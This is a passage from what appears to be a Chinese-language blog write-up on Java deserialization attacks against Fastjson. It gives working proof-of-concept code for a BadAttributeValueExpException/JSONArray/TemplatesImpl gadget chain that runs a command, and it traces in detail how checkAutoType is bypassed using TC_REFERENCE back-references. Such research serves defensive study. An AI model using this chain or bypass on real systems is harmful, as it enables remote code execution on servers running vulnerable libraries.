class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonSer</span> &#123;<br>    <span class="hljs-comment">// 利用 javassist 生成恶意类字节码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-comment">// 封装 setFieldValue 方法，用来反射设置字段值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = getTemplates();<br><br>        <span class="hljs-comment">//装载Template</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(template, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(template, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Evil&quot;</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(template);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        <span class="hljs-comment">// 直接写入 </span><br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//            while(true)&#123;&#125;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在 45 行 改变了变量</p><p>这段代码就是使用了 badAttributeValueExpException 直接进行反序列化，毫无疑问，抛出 <code>autoType is not support</code> 异常</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403192131685.png" alt="image-20250403192131685"></p><p>我们在反序列化的时候，就经常碰到 checkAutoType 拦截我们的 @type 的类，那么序列化 又是为什么会执行 checkAutoType 呢？ </p><p>这里需要我们了解 java 的反序列化流程，可以参考这篇文章：<a href="https://blog.kaibro.tw/2020/02/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BreadObject%E5%88%86%E6%9E%90/">Java 反序列化之 readObject 分析 | Kaibro’s blog</a></p><h4 id="BadAttributeValueExpException-反序列化流程"><a href="#BadAttributeValueExpException-反序列化流程" class="headerlink" title="BadAttributeValueExpException 反序列化流程"></a>BadAttributeValueExpException 反序列化流程</h4><p>首先我们肯定是要进入 java.io.ObjectInputStream#readObject 方法的，里面调用 readObject0() 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403213951787.png" alt="image-20250403213951787"></p><p>步入，因为我们的 badAttributeValueExpException 对象，是普通对象类型 会进入 TC_OBJECT 分支</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403214156178.png" alt="image-20250403214156178"></p><p>这里的几个分支 简单说一下</p><ul><li><code>TC_OBJECT</code>: 表示流中接下来是一个新的普通对象实例。会调用 <code>readOrdinaryObject()</code>。</li><li><code>TC_CLASS</code>: 表示流中接下来是一个 <code>java.lang.Class</code> 对象。会调用 <code>readClass()</code>。</li><li><code>TC_CLASSDESC</code>: 表示流中接下来是一个 <strong>类描述符</strong> (<code>ObjectStreamClass</code>) 的数据。会调用 <code>readClassDesc()</code>。</li><li><code>TC_PROXYCLASSDESC</code>: 表示流中接下来是一个动态代理类的描述符。会调用 <code>readProxyDesc()</code>。</li><li><code>TC_STRING</code>, <code>TC_LONGSTRING</code>: 表示字符串。会调用 <code>readString()</code> 或 <code>readLongUTF()</code>。</li><li><code>TC_ARRAY</code>: 表示数组。会调用 <code>readArray()</code>。</li><li><code>TC_ENUM</code>: 表示枚举常量。会调用 <code>readEnum()</code>。</li><li><code>TC_NULL</code>: 表示一个 <code>null</code> 引用。直接返回 <code>null</code>。</li><li><code>TC_REFERENCE</code>: 表示对流中先前已读取对象的 <strong>反向引用 (句柄)</strong>。会调用 <code>readHandle()</code> 来获取缓存的对象。</li><li><code>TC_EXCEPTION</code>: 表示序列化的异常。会调用 <code>readFatalException()</code>。</li><li><code>TC_BLOCKDATA</code>, <code>TC_BLOCKDATALONG</code>: 表示原始数据块（通常在自定义 <code>readObject</code> 方法中使用）。会调用 <code>readBlockHeader()</code>。</li><li><code>TC_RESET</code>: 表示流重置标记。会处理流状态重置。</li><li><code>TC_ENDBLOCKDATA</code>: 表示原始数据块的结束。</li></ul><p>跟如 readOrdinaryObject() 方法 ，它会调用 <code>readClassDesc()</code> 来获取对象的类信息 (<code>ObjectStreamClass</code>)</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404101759741.png" alt="image-20250404101759741"></p><p>跟进 readClassDesc 方法</p><p>首先读取 一个类描述符</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404101923458.png" alt="image-20250404101923458"></p><p>根据描述符，进入 <code>case TC_CLASSDESC</code> 分支 </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404102317546.png" alt="image-20250404102317546"></p><p>继续跟 readNonProxyDesc 方法，它就是调用 <code>readClassDescriptor()</code> 从流中读取序列化的 <code>ObjectStreamClass</code> 数据。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404102951878.png" alt="image-20250404102951878"></p><p><code>readClassDescriptor()</code> 会去调用，<code>readNonProxy()</code> 方法，读取 <code>类名</code> , <code>serialVersionUID</code> , <code>标志位</code> , <code>字段数量 类型和名称</code> 等信息，最后封装为 ObjectStreamClass 对象，赋值给 readDesc 变量</p><p>摘下来 看看这个 <code>readNonProxy()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 从给定的输入流中读取非代理类描述符信息。</span><br><span class="hljs-comment"> * 生成的类描述符并非完全功能性的，仅能作为 ObjectInputStream.resolveClass()</span><br><span class="hljs-comment"> * 和 ObjectStreamClass.initNonProxy() 方法的输入。</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> in 输入流，用于读取类描述符信息</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException 如果在读取过程中发生I/O错误</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ClassNotFoundException 如果无法找到对应的类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">readNonProxy</span><span class="hljs-params">(ObjectInputStream in)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// 从输入流中读取类名</span><br>    name = in.readUTF();<br>    <span class="hljs-comment">// 从输入流中读取序列化ID，并将其包装为Long对象</span><br>    suid = Long.valueOf(in.readLong());<br>    <span class="hljs-comment">// 设置isProxy标志为false，表示这不是一个代理类描述符</span><br>    isProxy = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// 从输入流中读取类描述符标志</span><br>    <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> in.readByte();<br>    <span class="hljs-comment">// 根据标志判断该类是否具有writeObject方法</span><br>    hasWriteObjectData =<br>        ((flags &amp; ObjectStreamConstants.SC_WRITE_METHOD) != <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 根据标志判断该类是否使用块数据模式</span><br>    hasBlockExternalData =<br>        ((flags &amp; ObjectStreamConstants.SC_BLOCK_DATA) != <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 根据标志判断该类是否为Externalizable类型</span><br>    externalizable =<br>        ((flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 检查标志冲突：类不能同时为Externalizable和Serializable</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">sflag</span> <span class="hljs-operator">=</span><br>        ((flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (externalizable &amp;&amp; sflag) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<br>            name, <span class="hljs-string">&quot;可序列化和外部化标志冲突&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 综合判断类是否为可序列化类型</span><br>    serializable = externalizable || sflag;<br>    <span class="hljs-comment">// 根据标志判断该类是否为枚举类型</span><br>    isEnum = ((flags &amp; ObjectStreamConstants.SC_ENUM) != <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 枚举类型的序列化ID必须为0，否则抛出异常</span><br>    <span class="hljs-keyword">if</span> (isEnum &amp;&amp; suid.longValue() != <span class="hljs-number">0L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(name,<br>            <span class="hljs-string">&quot;枚举描述符具有非零的serialVersionUID: &quot;</span> + suid);<br>    &#125;<br><br>    <span class="hljs-comment">// 从输入流中读取字段数量</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">numFields</span> <span class="hljs-operator">=</span> in.readShort();<br>    <span class="hljs-comment">// 枚举类型的字段数量必须为0，否则抛出异常</span><br>    <span class="hljs-keyword">if</span> (isEnum &amp;&amp; numFields != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(name,<br>            <span class="hljs-string">&quot;枚举描述符具有非零字段数: &quot;</span> + numFields);<br>    &#125;<br>    <span class="hljs-comment">// 初始化字段数组，如果字段数量为0，则使用NO_FIELDS常量</span><br>    fields = (numFields &gt; <span class="hljs-number">0</span>) ?<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectStreamField</span>[numFields] : NO_FIELDS;<br>    <span class="hljs-comment">// 遍历读取每个字段的信息</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; numFields; i++) &#123;<br>        <span class="hljs-type">char</span> <span class="hljs-variable">tcode</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>) in.readByte();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fname</span> <span class="hljs-operator">=</span> in.readUTF();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> ((tcode == <span class="hljs-string">&#x27;L&#x27;</span>) || (tcode == <span class="hljs-string">&#x27;[&#x27;</span>)) ?<br>            in.readTypeString() : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[] &#123; tcode &#125;);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建字段描述符对象</span><br>            fields[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectStreamField</span>(fname, signature, <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException e) &#123;<br>            <span class="hljs-comment">// 如果创建字段描述符时发生异常，抛出InvalidClassException</span><br>            <span class="hljs-keyword">throw</span> (IOException) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(name,<br>                <span class="hljs-string">&quot;字段描述符无效: &quot;</span> + fname).initCause(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 计算字段偏移量</span><br>    computeFieldOffsets();<br>&#125;<br></code></pre></td></tr></table></figure><p> 我们回到 <code>readNonProxy()</code> 方法，调用 resolveClass() 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404110205515.png" alt="image-20250404110205515"></p><p>resolveClass() 方法 直接 Class.forName() 返回类了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404110304027.png" alt="image-20250404110304027"></p><p>接着 会去做一次 JEP290 的检查</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404110446087.png" alt="image-20250404110446087"></p><p>然后调用 <code>initNonProxy()</code> 进行一列的初始化，最后 return 返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404111055128.png" alt="image-20250404111055128"></p><p>接着 我们 弹栈到最初的 <code>java.io.ObjectInputStream#readOrdinaryObject</code> 方法，对类进行实例化</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404111354581.png" alt="image-20250404111354581"></p><p>后边会去调用 readSerialData 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403215030332.png" alt="image-20250403215030332"></p><p>如果我们有自己重写 <code>readObject</code>，则调用 <code>slotDesc.invokeReadObject(obj, this)</code>；若没有，则调用 <code>defaultReadFields</code> 填充数据。 很显然 BadAttributeValueException 是重写了 readObject 方法的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404115818692.png" alt="image-20250404115818692"></p><p>后续就是一系列的 invoke() 方法 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:<span class="hljs-number">71</span>)<br>    jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="hljs-number">1</span>)<br>    jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="hljs-number">62</span>)<br>    jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="hljs-number">43</span>)<br>    java.lang.reflect.Method.invoke(Method.java:<span class="hljs-number">566</span>)<br>    java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:<span class="hljs-number">1160</span>)<br></code></pre></td></tr></table></figure><p>就来到了我们的 <code>BadAttributeValueExpException的readObject</code> 方法，先去执行 <code>readFields()</code> 方法 ，我们在 payload 中 给 BadAttributeValueExpException 的 <code>val</code> 变了复制为了 JSONArray 对象，里面封装了 TemplateImpl 恶意类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404121544020.png" alt="image-20250404121544020"></p><p>我们步入跟一下，看到调用了 java.io.ObjectInputStream.GetFieldImpl#readFields </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404121633966.png" alt="image-20250404121633966"></p><h4 id="JSONArray-反序列化"><a href="#JSONArray-反序列化" class="headerlink" title="JSONArray 反序列化"></a>JSONArray 反序列化</h4><p>接着跟 又看到了 熟悉的 <code>readObject0()</code> 方法，就是上面讲的 反序列化流程，上边是反序列化 BadAttributeValueExpException 这次是 <code>JSONArray</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404121717999.png" alt="image-20250404121717999"></p><p>就不在重复了，直接来到 JSONArray 的 实例化和 readSerialData 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404122609663.png" alt="image-20250404122609663"></p><p>接着</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404122652103.png" alt="image-20250404122652103"></p><p>我们进入，依然执行 <code>slotDesc.invokeReadObject()</code> 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404123035608.png" alt="image-20250404123035608"></p><p>接着又是一堆 invoke() 方法，来到 JSONArray 的 readObject() 方法，发现他把反序列化的流程 委托给 SecureObjectInputStream 这个内部类来进行完成了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404123359585.png" alt="image-20250404123359585"></p><p>我们跟入，要去执行 defaultReadFields() 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404123707864.png" alt="image-20250404123707864"></p><p>看到 其内部依然是 readObject0() 进行反序列化 ArrayList 对象</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404123907631.png" alt="image-20250404123907631"></p><h4 id="ArrayList-反序列化"><a href="#ArrayList-反序列化" class="headerlink" title="ArrayList 反序列化"></a>ArrayList 反序列化</h4><p>依然是和上面一样的流程， readNonProxyDesc 调用 resolveClass() 的地方</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404124210176.png" alt="image-20250404124210176"></p><blockquote><p>这里因为 SecureObjectInputStream 重写了 resolveClass() 方法，所以这里不在执行 ObjectInputStream#resolveClass 默认的方法了，而是会先执行 JSONObject.SecureObjectInputStream#resolveClass 方法，最后再去 ObjectInputStream#resolveClass 返回类</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404140355672.png" alt="image-20250404140355672"></p><p>ArrayList 在白名单中 所以不会走 checkAutoType 检查</p><h4 id="TemplateImpl-反序列化"><a href="#TemplateImpl-反序列化" class="headerlink" title="TemplateImpl 反序列化"></a>TemplateImpl 反序列化</h4><p>TemplateImpl 和 ArrayList 的流程是一样的，都会去走 <code>SecureObjectInputStream#resolveClass</code> 方法 ，但是 TemplateImpl 不在 mappings 白名单中，会进入 checkAutoType 的检查<br><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404124718411.png" alt="image-20250404124718411"></p><p>很明显这里的 checkAutoType 黑名单里是有 TemplateImpl 类的，自然也就抛出了 autoType is not support. 异常</p><p>最后看一下完整的调用栈</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">resolveClass:</span><span class="hljs-number">597</span>, JSONObject<span class="hljs-number">$SecureObjectInputStream</span> (<span class="hljs-keyword">com</span>.alibaba.fastjson)<br><span class="hljs-symbol">readNonProxyDesc:</span><span class="hljs-number">1886</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readClassDesc:</span><span class="hljs-number">1772</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readOrdinaryObject:</span><span class="hljs-number">2060</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject0:</span><span class="hljs-number">1594</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">430</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">928</span>, ArrayList (java.util)<br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">566</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">invokeReadObject:</span><span class="hljs-number">1160</span>, ObjectStreamClass (java.io)<br><span class="hljs-symbol">readSerialData:</span><span class="hljs-number">2216</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readOrdinaryObject:</span><span class="hljs-number">2087</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject0:</span><span class="hljs-number">1594</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">defaultReadFields:</span><span class="hljs-number">2355</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">defaultReadObject:</span><span class="hljs-number">566</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">486</span>, JSONArray (<span class="hljs-keyword">com</span>.alibaba.fastjson)<br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">566</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">invokeReadObject:</span><span class="hljs-number">1160</span>, ObjectStreamClass (java.io)<br><span class="hljs-symbol">readSerialData:</span><span class="hljs-number">2216</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readOrdinaryObject:</span><span class="hljs-number">2087</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject0:</span><span class="hljs-number">1594</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readFields:</span><span class="hljs-number">2534</span>, ObjectInputStream<span class="hljs-number">$GetFieldImpl</span> (java.io)<br><span class="hljs-symbol">readFields:</span><span class="hljs-number">610</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">71</span>, BadAttributeValueExpException (javax.management)<br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">566</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">invokeReadObject:</span><span class="hljs-number">1160</span>, ObjectStreamClass (java.io)<br><span class="hljs-symbol">readSerialData:</span><span class="hljs-number">2216</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readOrdinaryObject:</span><span class="hljs-number">2087</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject0:</span><span class="hljs-number">1594</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">430</span>, ObjectInputStream (java.io)<br><span class="hljs-symbol">main:</span><span class="hljs-number">52</span>, FastjsonSer (<span class="hljs-keyword">com</span>.lingx5.fastjson2)<br></code></pre></td></tr></table></figure><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><blockquote><p>我们刚才也已经介绍过了引用的特性 (TC_REFERENCE)</p><p><code>TC_REFERENCE</code>: 表示对流中先前已读取对象的 <strong>反向引用 (句柄)</strong>。会调用 <code>readHandle()</code> 来获取缓存的对象。</p><p>TC_REFERENCE，是引用类型。序列化后的数据其实相当繁琐，多层嵌套很容易搞乱，在恢复对象的时候也不太容易。于是就有了引用这个东西，他可以引用在此之前已经出现过的对象。</p></blockquote><p>当我们在 JSONArray (ArrayList) 中的类是 普通的类（TC_OBJECT）时 <code>readObject0()</code> 就会去执行 readOrdinaryObject &#x3D;&gt; readNonProxyDesc() &#x3D;&gt; SecureObjectInputStream#resolveClass &#x3D;&gt; checkAutoType()</p><p>那么我们 如果不是普通类 而是利用 引用的特性(TC_REFERENCE) 不就可以 绕过 checkAutoType() 的执行了吗，反序列化出 TemplateImpl 进而去 执行后边的 toString 调用 getter 方法，实现恶意类执行</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>其实了解到这些以后，我们也来做一个实验， 向输入流里第一次写 TemplateImpl，第二次写 badAttributeValueExpException ，第一次反序列化 <code>TemplateImpl </code> 走正常的 ObjectInputStream#resolveClass</p><p>当第二次反序列化 TemplateImpl 时，也就是 JSONArray 中的 TemplateImpl ，会走 TC_REFERENCE 分支，从而避免了 checkAutoType 的检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.fastjson2;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> 